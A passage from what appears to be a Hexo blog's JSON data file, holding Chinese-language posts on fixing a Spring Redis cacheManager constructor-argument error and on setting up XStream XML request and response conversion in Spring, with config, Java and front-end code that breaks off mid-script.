Unsatisfied dependency expressed through constructor parameter 0: Ambiguous argument values for parameter of type [org.springframework.data.redis.core.RedisOperations] - did you specify the correct bean references as arguments?\nRelated cause: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'cacheManager' defined in class path resource [spring/spring-redis.xml]: Unsatisfied dependency expressed through constructor parameter 0: Ambiguous argument values for parameter of type [org.springframework.data.redis.core.RedisOperations] - did you specify the correct bean references as arguments?\nat org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:736)\nat org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:189)\nat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1193)\nat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1095)\nat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:513)\nat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483)\nat org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306)\nat org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230)\nat org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302)\nat org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197)\nat org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:761)\nat org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:866)\nat org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:542)\nat org.springframework.web.servlet.FrameworkServlet.configureAndRefreshWebApplicationContext(FrameworkServlet.java:668)\nat org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:634)\nat org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:682)\nat org.springframework.web.servlet.FrameworkServlet.initWebApplicationContext(FrameworkServlet.java:553)\nat org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:494)\nat org.springframework.web.servlet.HttpServletBean.init(HttpServletBean.java:138)\nat javax.servlet.GenericServlet.init(GenericServlet.java:160)\nat org.apache.catalina.core.StandardWrapper.initServlet(StandardWrapper.java:1280)\nat org.apache.catalina.core.StandardWrapper.loadServlet(StandardWrapper.java:1193)\nat org.apache.catalina.core.StandardWrapper.load(StandardWrapper.java:1088)\nat org.apache.catalina.core.StandardContext.loadOnStartup(StandardContext.java:5033)\nat org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5317)\nat org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)\nat org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1559)\nat org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1549)\nat java.util.concurrent.FutureTask.run(FutureTask.java:266)\nat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\nat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\nat java.lang.Thread.run(Thread.java:745)\n```\n\n\n翻看源码可以发现是jar包版本升级之后，该类改命名引起的错误，为了解决该问题配置文件应更改如下：\n\n\n```\n<bean id=\"connectionFactory\"\nclass=\"org.springframework.data.redis.connection.jedis.JedisConnectionFactory\"\np:host-name=\"${redis.host}\" p:port=\"${redis.port}\" p:password=\"${redis.pass}\"\np:pool-config-ref=\"poolConfig\" />\n\n\n<bean id=\"redisTemplate\" class=\"org.springframework.data.redis.core.RedisTemplate\">\n<property name=\"connectionFactory\" ref=\"connectionFactory\" />\n</bean>\n\n<!-- redis缓存管理器 -->\n<bean id=\"cacheManager\" class=\"org.springframework.data.redis.cache.RedisCacheManager\"\nc:redis-operations-ref=\"redisTemplate\" />\n```\n\n\n将template-ref改为redis-operations-ref即可，或者改cacheManager改成如下也是可以的：\n\n\n```\n<!-- redis缓存管理器 -->\n<bean id=\"cacheManager\" class=\"org.springframework.data.redis.cache.RedisCacheManager\"\nc:_0-ref=\"redisTemplate\" />\n\n```\n\n相比之下后面那种方式不受改名影响\n","source":"_posts/2017-05-20_spring_redis.md","raw":"---\ntitle: 关于spring redis 缓存配置错误的问题\ndate: 2017-05-20 08:25:11\ntags: redis\npermalink: spring-redis\nkeywords: redis, UnsatisfiedDependencyException\nrId: MB-17052001\n---\n\n按照网上提供的配置spring redis缓存配置问题，启动后出现如下错误\n\n```\norg.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'cacheManager' defined in class path resource [spring/spring-redis.xml]: Unsatisfied dependency expressed through constructor parameter 0: Ambiguous argument values for parameter of type [org.springframework.data.redis.core.RedisOperations] - did you specify the correct bean references as arguments?\nRelated cause: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'cacheManager' defined in class path resource [spring/spring-redis.xml]: Unsatisfied dependency expressed through constructor parameter 0: Ambiguous argument values for parameter of type [org.springframework.data.redis.core.RedisOperations] - did you specify the correct bean references as arguments?\nat org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:736)\nat org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:189)\nat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1193)\nat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1095)\nat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:513)\nat org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483)\nat org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306)\nat org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230)\nat org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302)\nat org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197)\nat org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:761)\nat org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:866)\nat org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:542)\nat org.springframework.web.servlet.FrameworkServlet.configureAndRefreshWebApplicationContext(FrameworkServlet.java:668)\nat org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:634)\nat org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:682)\nat org.springframework.web.servlet.FrameworkServlet.initWebApplicationContext(FrameworkServlet.java:553)\nat org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:494)\nat org.springframework.web.servlet.HttpServletBean.init(HttpServletBean.java:138)\nat javax.servlet.GenericServlet.init(GenericServlet.java:160)\nat org.apache.catalina.core.StandardWrapper.initServlet(StandardWrapper.java:1280)\nat org.apache.catalina.core.StandardWrapper.loadServlet(StandardWrapper.java:1193)\nat org.apache.catalina.core.StandardWrapper.load(StandardWrapper.java:1088)\nat org.apache.catalina.core.StandardContext.loadOnStartup(StandardContext.java:5033)\nat org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5317)\nat org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)\nat org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1559)\nat org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1549)\nat java.util.concurrent.FutureTask.run(FutureTask.java:266)\nat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)\nat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)\nat java.lang.Thread.run(Thread.java:745)\n```\n\n\n翻看源码可以发现是jar包版本升级之后，该类改命名引起的错误，为了解决该问题配置文件应更改如下：\n\n\n```\n<bean id=\"connectionFactory\"\nclass=\"org.springframework.data.redis.connection.jedis.JedisConnectionFactory\"\np:host-name=\"${redis.host}\" p:port=\"${redis.port}\" p:password=\"${redis.pass}\"\np:pool-config-ref=\"poolConfig\" />\n\n\n<bean id=\"redisTemplate\" class=\"org.springframework.data.redis.core.RedisTemplate\">\n<property name=\"connectionFactory\" ref=\"connectionFactory\" />\n</bean>\n\n<!-- redis缓存管理器 -->\n<bean id=\"cacheManager\" class=\"org.springframework.data.redis.cache.RedisCacheManager\"\nc:redis-operations-ref=\"redisTemplate\" />\n```\n\n\n将template-ref改为redis-operations-ref即可，或者改cacheManager改成如下也是可以的：\n\n\n```\n<!-- redis缓存管理器 -->\n<bean id=\"cacheManager\" class=\"org.springframework.data.redis.cache.RedisCacheManager\"\nc:_0-ref=\"redisTemplate\" />\n\n```\n\n相比之下后面那种方式不受改名影响\n","slug":"spring-redis","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi05b000ag0ukfmek0zk6","content":"<p>按照网上提供的配置spring redis缓存配置问题，启动后出现如下错误</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name &apos;cacheManager&apos; defined in class path resource [spring/spring-redis.xml]: Unsatisfied dependency expressed through constructor parameter 0: Ambiguous argument values for parameter of type [org.springframework.data.redis.core.RedisOperations] - did you specify the correct bean references as arguments?</span><br><span class=\"line\">Related cause: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name &apos;cacheManager&apos; defined in class path resource [spring/spring-redis.xml]: Unsatisfied dependency expressed through constructor parameter 0: Ambiguous argument values for parameter of type [org.springframework.data.redis.core.RedisOperations] - did you specify the correct bean references as arguments?</span><br><span class=\"line\">at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:736)</span><br><span class=\"line\">at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:189)</span><br><span class=\"line\">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1193)</span><br><span class=\"line\">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1095)</span><br><span class=\"line\">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:513)</span><br><span class=\"line\">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483)</span><br><span class=\"line\">at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306)</span><br><span class=\"line\">at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230)</span><br><span class=\"line\">at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302)</span><br><span class=\"line\">at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197)</span><br><span class=\"line\">at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:761)</span><br><span class=\"line\">at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:866)</span><br><span class=\"line\">at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:542)</span><br><span class=\"line\">at org.springframework.web.servlet.FrameworkServlet.configureAndRefreshWebApplicationContext(FrameworkServlet.java:668)</span><br><span class=\"line\">at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:634)</span><br><span class=\"line\">at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:682)</span><br><span class=\"line\">at org.springframework.web.servlet.FrameworkServlet.initWebApplicationContext(FrameworkServlet.java:553)</span><br><span class=\"line\">at org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:494)</span><br><span class=\"line\">at org.springframework.web.servlet.HttpServletBean.init(HttpServletBean.java:138)</span><br><span class=\"line\">at javax.servlet.GenericServlet.init(GenericServlet.java:160)</span><br><span class=\"line\">at org.apache.catalina.core.StandardWrapper.initServlet(StandardWrapper.java:1280)</span><br><span class=\"line\">at org.apache.catalina.core.StandardWrapper.loadServlet(StandardWrapper.java:1193)</span><br><span class=\"line\">at org.apache.catalina.core.StandardWrapper.load(StandardWrapper.java:1088)</span><br><span class=\"line\">at org.apache.catalina.core.StandardContext.loadOnStartup(StandardContext.java:5033)</span><br><span class=\"line\">at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5317)</span><br><span class=\"line\">at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)</span><br><span class=\"line\">at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1559)</span><br><span class=\"line\">at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1549)</span><br><span class=\"line\">at java.util.concurrent.FutureTask.run(FutureTask.java:266)</span><br><span class=\"line\">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)</span><br><span class=\"line\">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><br><span class=\"line\">at java.lang.Thread.run(Thread.java:745)</span><br></pre></td></tr></table></figure>\n\n<p>翻看源码可以发现是jar包版本升级之后，该类改命名引起的错误，为了解决该问题配置文件应更改如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean id=&quot;connectionFactory&quot;</span><br><span class=\"line\">class=&quot;org.springframework.data.redis.connection.jedis.JedisConnectionFactory&quot;</span><br><span class=\"line\">p:host-name=&quot;$&#123;redis.host&#125;&quot; p:port=&quot;$&#123;redis.port&#125;&quot; p:password=&quot;$&#123;redis.pass&#125;&quot;</span><br><span class=\"line\">p:pool-config-ref=&quot;poolConfig&quot; /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;bean id=&quot;redisTemplate&quot; class=&quot;org.springframework.data.redis.core.RedisTemplate&quot;&gt;</span><br><span class=\"line\">&lt;property name=&quot;connectionFactory&quot; ref=&quot;connectionFactory&quot; /&gt;</span><br><span class=\"line\">&lt;/bean&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- redis缓存管理器 --&gt;</span><br><span class=\"line\">&lt;bean id=&quot;cacheManager&quot; class=&quot;org.springframework.data.redis.cache.RedisCacheManager&quot;</span><br><span class=\"line\">c:redis-operations-ref=&quot;redisTemplate&quot; /&gt;</span><br></pre></td></tr></table></figure>\n\n<p>将template-ref改为redis-operations-ref即可，或者改cacheManager改成如下也是可以的：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- redis缓存管理器 --&gt;</span><br><span class=\"line\">&lt;bean id=&quot;cacheManager&quot; class=&quot;org.springframework.data.redis.cache.RedisCacheManager&quot;</span><br><span class=\"line\">c:_0-ref=&quot;redisTemplate&quot; /&gt;</span><br></pre></td></tr></table></figure>\n\n<p>相比之下后面那种方式不受改名影响</p>\n","site":{"data":{}},"excerpt":"","more":"<p>按照网上提供的配置spring redis缓存配置问题，启动后出现如下错误</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name &apos;cacheManager&apos; defined in class path resource [spring/spring-redis.xml]: Unsatisfied dependency expressed through constructor parameter 0: Ambiguous argument values for parameter of type [org.springframework.data.redis.core.RedisOperations] - did you specify the correct bean references as arguments?</span><br><span class=\"line\">Related cause: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name &apos;cacheManager&apos; defined in class path resource [spring/spring-redis.xml]: Unsatisfied dependency expressed through constructor parameter 0: Ambiguous argument values for parameter of type [org.springframework.data.redis.core.RedisOperations] - did you specify the correct bean references as arguments?</span><br><span class=\"line\">at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:736)</span><br><span class=\"line\">at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:189)</span><br><span class=\"line\">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1193)</span><br><span class=\"line\">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1095)</span><br><span class=\"line\">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:513)</span><br><span class=\"line\">at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:483)</span><br><span class=\"line\">at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:306)</span><br><span class=\"line\">at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:230)</span><br><span class=\"line\">at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:302)</span><br><span class=\"line\">at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:197)</span><br><span class=\"line\">at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:761)</span><br><span class=\"line\">at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:866)</span><br><span class=\"line\">at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:542)</span><br><span class=\"line\">at org.springframework.web.servlet.FrameworkServlet.configureAndRefreshWebApplicationContext(FrameworkServlet.java:668)</span><br><span class=\"line\">at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:634)</span><br><span class=\"line\">at org.springframework.web.servlet.FrameworkServlet.createWebApplicationContext(FrameworkServlet.java:682)</span><br><span class=\"line\">at org.springframework.web.servlet.FrameworkServlet.initWebApplicationContext(FrameworkServlet.java:553)</span><br><span class=\"line\">at org.springframework.web.servlet.FrameworkServlet.initServletBean(FrameworkServlet.java:494)</span><br><span class=\"line\">at org.springframework.web.servlet.HttpServletBean.init(HttpServletBean.java:138)</span><br><span class=\"line\">at javax.servlet.GenericServlet.init(GenericServlet.java:160)</span><br><span class=\"line\">at org.apache.catalina.core.StandardWrapper.initServlet(StandardWrapper.java:1280)</span><br><span class=\"line\">at org.apache.catalina.core.StandardWrapper.loadServlet(StandardWrapper.java:1193)</span><br><span class=\"line\">at org.apache.catalina.core.StandardWrapper.load(StandardWrapper.java:1088)</span><br><span class=\"line\">at org.apache.catalina.core.StandardContext.loadOnStartup(StandardContext.java:5033)</span><br><span class=\"line\">at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5317)</span><br><span class=\"line\">at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)</span><br><span class=\"line\">at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1559)</span><br><span class=\"line\">at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1549)</span><br><span class=\"line\">at java.util.concurrent.FutureTask.run(FutureTask.java:266)</span><br><span class=\"line\">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)</span><br><span class=\"line\">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)</span><br><span class=\"line\">at java.lang.Thread.run(Thread.java:745)</span><br></pre></td></tr></table></figure>\n\n<p>翻看源码可以发现是jar包版本升级之后，该类改命名引起的错误，为了解决该问题配置文件应更改如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;bean id=&quot;connectionFactory&quot;</span><br><span class=\"line\">class=&quot;org.springframework.data.redis.connection.jedis.JedisConnectionFactory&quot;</span><br><span class=\"line\">p:host-name=&quot;$&#123;redis.host&#125;&quot; p:port=&quot;$&#123;redis.port&#125;&quot; p:password=&quot;$&#123;redis.pass&#125;&quot;</span><br><span class=\"line\">p:pool-config-ref=&quot;poolConfig&quot; /&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;bean id=&quot;redisTemplate&quot; class=&quot;org.springframework.data.redis.core.RedisTemplate&quot;&gt;</span><br><span class=\"line\">&lt;property name=&quot;connectionFactory&quot; ref=&quot;connectionFactory&quot; /&gt;</span><br><span class=\"line\">&lt;/bean&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- redis缓存管理器 --&gt;</span><br><span class=\"line\">&lt;bean id=&quot;cacheManager&quot; class=&quot;org.springframework.data.redis.cache.RedisCacheManager&quot;</span><br><span class=\"line\">c:redis-operations-ref=&quot;redisTemplate&quot; /&gt;</span><br></pre></td></tr></table></figure>\n\n<p>将template-ref改为redis-operations-ref即可，或者改cacheManager改成如下也是可以的：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- redis缓存管理器 --&gt;</span><br><span class=\"line\">&lt;bean id=&quot;cacheManager&quot; class=&quot;org.springframework.data.redis.cache.RedisCacheManager&quot;</span><br><span class=\"line\">c:_0-ref=&quot;redisTemplate&quot; /&gt;</span><br></pre></td></tr></table></figure>\n\n<p>相比之下后面那种方式不受改名影响</p>\n"},{"title":"spring基于xml格式数据交换的前后端配置与使用之xstream方式","date":"2017-08-18T10:07:42.000Z","keywords":"spring, xml, MarshallingHttpMessageConverter","rId":"MB-17081801","_content":"\nMarshallingHttpMessageConverter 方式解析xml（支持注解修改元素别名）配置及代码如下：\n\nxml配置文件中添加converter\n\n```\n<bean class=\"org.springframework.http.converter.xml.MarshallingHttpMessageConverter\">\n\t\t        <constructor-arg>\n\t\t        \t<bean class=\"org.springframework.oxm.xstream.XStreamMarshaller\">\n\t\t\t\t        <property name=\"streamDriver\">\n\t\t\t\t            <bean class=\"com.thoughtworks.xstream.io.xml.StaxDriver\"/>\n\t\t\t\t        </property>\n\t\t\t\t        <property name=\"annotatedClasses\">\n\t\t\t\t            <list>\n\t\t\t\t                <value>com.mufeng.dto.in.Xml</value>\n\t\t\t\t                <value>com.mufeng.dto.out.TestDtoOut</value>\n\t\t\t\t            </list>\n\t\t\t\t        </property>\n\t\t\t\t    </bean>\n\t\t\t\t    \n\t\t        </constructor-arg>\n\t\t        <property name=\"supportedMediaTypes\">\n                \t<list>\n                \t\t<value>application/xml;charset=UTF-8</value>\n                \t\t<value>text/xml;charset=UTF-8</value>\n                \t\t<value>text/html;charset=UTF-8</value>\n                \t</list>\n                </property>\n\t\t\t</bean>\n\n```\n\npom文件\n\n\n```\n<!-- xstream xml start -->\n\t\t<dependency>\n\t\t\t<groupId>com.thoughtworks.xstream</groupId>\n\t\t\t<artifactId>xstream</artifactId>\n\t\t\t<version>1.4.10</version>\n\t\t</dependency>\n\n\t\t<dependency>\n\t\t\t<groupId>org.springframework</groupId>\n\t\t\t<artifactId>spring-oxm</artifactId>\n\t\t\t<version>4.3.7.RELEASE</version>\n\t\t</dependency>\n\t\t<!-- xstream xml end -->\n```\n\ncontroller文件\n\n```\n@RequestMapping(value = \"txml\", headers={\"content-type=application/xml\"})\n\tpublic Object testXml(@RequestBody Xml xml/*, HttpServletRequest req*/) {\n                // 这部分主要打印看看，验证request xml方式入参成功\n\t\ttry {\n\t\t\tObjectMapper mapper = new ObjectMapper();\n\t\t\tmapper.disable(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES)\n\t\t\t\t\t.enable(JsonGenerator.Feature.IGNORE_UNKNOWN).enable(JsonParser.Feature.ALLOW_UNQUOTED_FIELD_NAMES);\n\t\t\tSystem.out.println(mapper.writeValueAsString(xml));// 打印入参数据可以看到成功入参\n\t\t} catch (JsonProcessingException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\n                // response出参数据\n\t\tTestDtoOut tdo = new TestDtoOut();\n\t\ttdo.code = 200;\n\t\ttdo.msg = \"\";//xml.getToUserName();\n\t\treturn tdo;\n\t}\n\n```\n两个出入参dto（只截部分代码）\n\n```\npackage com.mufeng.dto.in;\n\nimport com.thoughtworks.xstream.annotations.XStreamAlias;\n\n@XStreamAlias(value=\"xml\")// 给根节点别名，不然标签名会带上包名\npublic class Xml {\n\t@XStreamAlias(value=\"ToUserName\")// 给属性别名，可以使实现xml标签名与属性名不同的需求\n\tString toUserName;\n\tString FromUserName;// 不给别名，默认标签名与属性名一致\n\tLong CreateTime;\n\tString MsgType;\n\tLong MsgId;\n\tString Content;\n```\n```\npackage com.mufeng.dto.out;\n\nimport com.thoughtworks.xstream.annotations.XStreamAlias;\n\n@XStreamAlias(value=\"testDtoOut\")\npublic class TestDtoOut {\n\n\tpublic Integer code;\n\tpublic String msg;\n```\n\n\n前端文件html\n\n```\n<html>\n<head>\n<script type=\"text/javascript\">\n  var xmlData = \"<xml><ToUserName><![CDATA[toUser]]></ToUserName><FromUserName><![CDATA[fromUser]]></FromUserName><CreateTime>1348831860</CreateTime><MsgType><![CDATA[text]]></MsgType><Content><![CDATA[this is a test]]></Content><MsgId>1234567890123456</MsgId></xml>\";\n\nvar xmlhttp;\nfunction loadXMLDoc(url)\n{\nxmlhttp=null;\nif (window.XMLHttpRequest)\n  {// all modern browsers\n  xmlhttp=new XMLHttpRequest();\n  }\nelse if (window.ActiveXObject)\n  {// for IE5, IE6\n  xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\");\n  }\nif (xmlhttp!=null)\n  {\n  xmlhttp.onreadystatechange=state_Change;\n  xmlhttp.open(\"POST\",url,true);\n  xmlhttp.setRequestHeader(\"Accept\",\"application/xml\"); \n  xmlhttp.setRequestHeader(\"Content-Type\",\"application/xml\"); \n  xmlhttp.send(xmlData);\n  }\nelse\n  {\n  alert(\"Your browser does not support XMLHTTP.\");\n  }\n}\n\nfunction state_Change()\n{\nif (xmlhttp.readyState==4)\n  {// 4 = \"loaded\"\n  if (xmlhttp.status==200)\n    {// 200 = \"OK\"\n    document.getElementById('p1').innerHTML=\"This file was last modified on: \" + xmlhttp.getResponseHeader('Last-Modified');\n    }\n  else\n    {\n    alert(\"Problem retrieving data:\" + xmlhttp.statusText);\n    }\n  